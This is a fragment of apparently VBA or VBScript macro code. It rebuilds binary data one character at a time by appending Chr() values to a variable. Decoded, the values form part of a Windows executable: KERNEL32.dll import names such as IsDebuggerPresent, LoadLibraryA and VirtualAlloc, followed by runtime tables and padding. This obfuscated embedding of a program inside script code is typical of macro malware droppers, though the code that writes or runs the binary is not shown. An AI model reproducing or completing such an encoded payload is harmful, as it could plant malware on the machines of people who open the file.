ySXd=ySXd&Chr(85)&Chr(110)&Chr(104)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(100)&Chr(69)&Chr(120)&Chr(99)&Chr(101)&Chr(112)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(70)&Chr(105)&Chr(108)&Chr(116)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(209)&Chr(2)&Chr(73)&Chr(115)&Chr(68)&Chr(101)&Chr(98)&Chr(117)&Chr(103)&Chr(103)&Chr(101)&Chr(114)&Chr(80)&Chr(114)&Chr(101)&Chr(115)&Chr(101)&Chr(110)&Chr(116)&Chr(0)&Chr(241)&Chr(2)&Chr(76)&Chr(111)&Chr(97)&Chr(100)&Chr(76)&Chr(105)&Chr(98)&Chr(114)&Chr(97)&Chr(114)&Chr(121)&Chr(65)&Chr(0)&Chr(0)&Chr(181)&Chr(2)&Chr(73)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(101)&Chr(67)&Chr(114)&Chr(105)&Chr(116)&Chr(105)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(101)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(65)&Chr(110)&Chr(100)&Chr(83)&Chr(112)&Chr(105)&Chr(110)&Chr(67)&Chr(111)&Chr(117)&Chr(110)
ySXd=ySXd&Chr(116)&Chr(0)&Chr(91)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(67)&Chr(80)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(0)&Chr(82)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(65)&Chr(67)&Chr(80)&Chr(0)&Chr(0)&Chr(19)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(79)&Chr(69)&Chr(77)&Chr(67)&Chr(80)&Chr(0)&Chr(0)&Chr(219)&Chr(2)&Chr(73)&Chr(115)&Chr(86)&Chr(97)&Chr(108)&Chr(105)&Chr(100)&Chr(67)&Chr(111)&Chr(100)&Chr(101)&Chr(80)&Chr(97)&Chr(103)&Chr(101)&Chr(0)&Chr(157)&Chr(2)&Chr(72)&Chr(101)&Chr(97)&Chr(112)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(0)&Chr(84)&Chr(4)&Chr(86)&Chr(105)&Chr(114)&Chr(116)&Chr(117)&Chr(97)&Chr(108)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(0)&Chr(0)&Chr(164)&Chr(2)&Chr(72)&Chr(101)&Chr(97)&Chr(112)&Chr(82)&Chr(101)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(0)&Chr(146)&Chr(3)&Chr(82)&Chr(116)
ySXd=ySXd&Chr(108)&Chr(85)&Chr(110)&Chr(119)&Chr(105)&Chr(110)&Chr(100)&Chr(0)&Chr(166)&Chr(2)&Chr(72)&Chr(101)&Chr(97)&Chr(112)&Chr(83)&Chr(105)&Chr(122)&Chr(101)&Chr(0)&Chr(0)&Chr(232)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(101)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(65)&Chr(0)&Chr(0)&Chr(225)&Chr(2)&Chr(76)&Chr(67)&Chr(77)&Chr(97)&Chr(112)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(65)&Chr(0)&Chr(0)&Chr(26)&Chr(3)&Chr(77)&Chr(117)&Chr(108)&Chr(116)&Chr(105)&Chr(66)&Chr(121)&Chr(116)&Chr(101)&Chr(84)&Chr(111)&Chr(87)&Chr(105)&Chr(100)&Chr(101)&Chr(67)&Chr(104)&Chr(97)&Chr(114)&Chr(0)&Chr(227)&Chr(2)&Chr(76)&Chr(67)&Chr(77)&Chr(97)&Chr(112)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(87)&Chr(0)&Chr(0)&Chr(61)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(83)&Chr(116)&Chr(114)
ySXd=ySXd&Chr(105)&Chr(110)&Chr(103)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(65)&Chr(0)&Chr(0)&Chr(64)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(87)&Chr(0)&Chr(0)&Chr(75)&Chr(69)&Chr(82)&Chr(78)&Chr(69)&Chr(76)&Chr(51)&Chr(50)&Chr(46)&Chr(100)&Chr(108)&Chr(108)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(186)&Chr(20)&Chr(64)&Chr(0)
ySXd=ySXd&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(112)&Chr(134)&Chr(64)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(68)&Chr(134)&Chr(64)&Chr(0)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(24)&Chr(134)&Chr(64)&Chr(0)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(133)&Chr(64)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(84)&Chr(133)&Chr(64)&Chr(0)&Chr(17)&Chr(0)&Chr(0)&Chr(0)&Chr(36)&Chr(133)&Chr(64)&Chr(0)&Chr(18)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(64)&Chr(0)&Chr(19)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(132)&Chr(64)&Chr(0)&Chr(24)&Chr(0)&Chr(0)&Chr(0)&Chr(156)&Chr(132)&Chr(64)&Chr(0)&Chr(25)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(132)&Chr(64)&Chr(0)&Chr(26)&Chr(0)&Chr(0)&Chr(0)&Chr(60)&Chr(132)&Chr(64)&Chr(0)&Chr(27)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(132)&Chr(64)&Chr(0)&Chr(28)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(220)&Chr(131)&Chr(64)&Chr(0)&Chr(30)&Chr(0)&Chr(0)&Chr(0)&Chr(188)&Chr(131)&Chr(64)&Chr(0)&Chr(31)&Chr(0)&Chr(0)&Chr(0)&Chr(88)&Chr(131)&Chr(64)&Chr(0)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(131)&Chr(64)&Chr(0)&Chr(33)&Chr(0)&Chr(0)&Chr(0)&Chr(40)&Chr(130)&Chr(64)&Chr(0)&Chr(34)&Chr(0)&Chr(0)&Chr(0)&Chr(136)&Chr(129)&Chr(64)&Chr(0)&Chr(120)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(129)&Chr(64)&Chr(0)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(100)&Chr(129)&Chr(64)&Chr(0)&Chr(122)&Chr(0)&Chr(0)&Chr(0)&Chr(84)&Chr(129)&Chr(64)&Chr(0)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(129)&Chr(64)&Chr(0)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(129)&Chr(64)&Chr(0)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(7)&Chr(0)&Chr(0)&Chr(0)&Chr(120)&Chr(0)&Chr(0)&Chr(0)&Chr(10)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(128)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(24)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(5)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(7)&Chr(0)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(7)&Chr(0)&Chr(0)&Chr(0)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(17)&Chr(0)&Chr(0)&Chr(0)&Chr(18)&Chr(0)&Chr(0)&Chr(0)&Chr(18)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(33)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(53)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(67)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(0)&Chr(0)&Chr(0)&Chr(17)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(83)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(87)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(0)&Chr(0)&Chr(0)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(108)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(109)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(112)&Chr(0)&Chr(0)&Chr(0)&Chr(28)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(0)&Chr(0)&Chr(0)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(130)&Chr(0)&Chr(0)&Chr(0)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(132)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(145)&Chr(0)&Chr(0)&Chr(0)&Chr(41)&Chr(0)&Chr(0)&Chr(0)&Chr(158)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(164)&Chr(0)&Chr(0)&Chr(0)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(167)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(183)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(17)&Chr(0)&Chr(0)&Chr(0)&Chr(206)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(215)&Chr(0)&Chr(0)&Chr(0)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(24)&Chr(7)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)
ySXd=ySXd&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(97)&Chr(98)&Chr(99)&Chr(100)&Chr(101)&Chr(102)&Chr(103)&Chr(104)&Chr(105)&Chr(106)&Chr(107)&Chr(108)&Chr(109)&Chr(110)&Chr(111)&Chr(112)&Chr(113)&Chr(114)&Chr(115)&Chr(116)&Chr(117)&Chr(118)&Chr(119)&Chr(120)&Chr(121)&Chr(122)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(66)&Chr(67)&Chr(68)&Chr(69)&Chr(70)&Chr(71)&Chr(72)&Chr(73)&Chr(74)&Chr(75)&Chr(76)&Chr(77)&Chr(78)&Chr(79)&Chr(80)&Chr(81)&Chr(82)&Chr(83)&Chr(84)&Chr(85)&Chr(86)&Chr(87)&Chr(88)&Chr(89)&Chr(90)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
